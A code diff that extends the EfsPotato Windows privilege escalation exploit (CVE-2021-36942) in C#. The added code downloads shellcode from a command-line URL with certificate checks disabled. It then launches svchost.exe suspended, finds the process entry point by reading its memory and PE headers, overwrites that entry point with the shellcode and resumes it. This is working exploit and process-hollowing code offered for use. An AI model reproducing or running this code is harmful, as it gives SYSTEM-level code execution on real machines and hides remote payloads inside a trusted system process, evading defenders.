@@ -1,4 +1,5 @@
 using System;
+using System.Net;
 using System.Collections.Generic;
 using System.Text;
 using System.Runtime.InteropServices;
@@ -11,20 +12,42 @@ using System.Security.Principal;
 using System.Linq;
 using Microsoft.Win32.SafeHandles;
 
-namespace Zcg.Exploits.Local
+namespace EfsPotato
 {
-    class EfsPotato
+    public class Program
     {
+     [DllImport("ntdll.dll", SetLastError = true)]
+     static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
+     [DllImport("kernel32.dll", SetLastError = true)]
+     static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+     [DllImport("kernel32.dll")]
+     static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+     [DllImport("kernel32.dll", SetLastError = true)]
+     static extern uint ResumeThread(IntPtr hThread);
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+                public IntPtr ExitStatus;
+                public IntPtr PebAddress;
+                public IntPtr AffinityMask;
+                public IntPtr BasePriority;
+                public IntPtr UniquePID;
+                public IntPtr InheritedFromUniqueProcessId;
+        }
+
+
+
         static void usage()
         {
-            Console.WriteLine("usage: EfsPotato <cmd> [pipe]");
+            Console.WriteLine("usage: EfsPotato <sc_url> [pipe]");
             Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)\r\n");
         }
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             Console.WriteLine("Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).");
             Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.");
             Console.WriteLine("CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]\r\n");
+            Console.WriteLine("Shellcode URL handling and process hollowing added by Precurse (@precurse)\r\n");
             if (args.Length < 1)
             {
                 usage();
@@ -85,6 +108,7 @@ namespace Zcg.Exploits.Local
                     IntPtr hRead, hWrite;
                     CreatePipe(out hRead, out hWrite, ref sa, 1024);
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                        uint tmp = 0;
                     STARTUPINFO si = new STARTUPINFO();
                     si.cb = Marshal.SizeOf(si);
                     si.hStdError = hWrite;
@@ -92,9 +116,43 @@ namespace Zcg.Exploits.Local
                     si.lpDesktop = "WinSta0\\Default";
                     si.dwFlags = 0x101;
                     si.wShowWindow = 0;
-                    if (CreateProcessAsUser(tkn, null, args[0], IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+                    String procname = "C:\\\\windows\\system32\\svchost.exe";
+                    string url = args[0];
+
+                    ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+                    System.Net.WebClient client = new System.Net.WebClient();
+                    byte[] shellcode = client.DownloadData(url);
+
+                    if (CreateProcessAsUser(tkn, null, procname, IntPtr.Zero, IntPtr.Zero, true, 0x4, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                     {
                         Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
+
+                              IntPtr hProcess = pi.hProcess;
+                                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+
+                              ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+                              IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+                              byte[] addrBuf = new byte[IntPtr.Size];
+                              IntPtr nRead = IntPtr.Zero;
+
+                              ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+                              IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                              byte[] data = new byte[0x200];
+                              ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+                              uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
+
+                              uint opthdr = e_lfanew_offset + 0x28;
+
+                              uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+                              IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+                              WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
+                              ResumeThread(pi.hThread);
+
+
                         tn = new Thread(ReadThread);
                         tn.IsBackground = true;
                         tn.Start(hRead);
